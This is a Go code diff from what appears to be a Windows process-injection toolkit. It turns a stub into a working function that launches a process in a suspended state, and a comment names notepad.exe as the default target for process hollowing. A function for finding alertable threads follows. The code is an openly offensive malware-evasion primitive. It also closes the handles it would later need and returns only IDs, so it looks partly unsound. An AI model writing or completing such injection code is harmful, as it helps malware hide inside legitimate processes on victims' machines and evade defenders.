@@ -178,9 +178,51 @@ type ProcessInfo struct {
 
 // CreateSuspendedProcess creates a process in suspended state
 func CreateSuspendedProcess(executablePath string) (*ProcessInfo, error) {
-	// This is a simplified stub implementation
-	// In production, this would use CreateProcess with CREATE_SUSPENDED flag
-	return nil, fmt.Errorf("CreateSuspendedProcess not implemented - requires full CreateProcess API integration")
+	if executablePath == "" {
+		// Use notepad.exe as default target for process hollowing
+		executablePath = "notepad.exe"
+	}
+
+	// Convert path to UTF16
+	cmdLine, err := windows.UTF16PtrFromString(executablePath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to convert path to UTF16: %v", err)
+	}
+
+	// Initialize startup info
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	si.Cb = uint32(unsafe.Sizeof(si))
+
+	// Create process in suspended state
+	err = windows.CreateProcess(
+		nil,                      // lpApplicationName
+		cmdLine,                  // lpCommandLine
+		nil,                      // lpProcessAttributes
+		nil,                      // lpThreadAttributes
+		false,                    // bInheritHandles
+		windows.CREATE_SUSPENDED, // dwCreationFlags
+		nil,                      // lpEnvironment
+		nil,                      // lpCurrentDirectory
+		&si,                      // lpStartupInfo
+		&pi,                      // lpProcessInformation
+	)
+
+	if err != nil {
+		return nil, fmt.Errorf("failed to create suspended process: %v", err)
+	}
+
+	// Return process information
+	processInfo := &ProcessInfo{
+		Process: pi.ProcessId,
+		Thread:  pi.ThreadId,
+	}
+
+	// Close handles as they're not needed for our use case
+	windows.CloseHandle(pi.Process)
+	windows.CloseHandle(pi.Thread)
+
+	return processInfo, nil
 }
 
 // FindAlertableThread finds a thread that can be made alertable
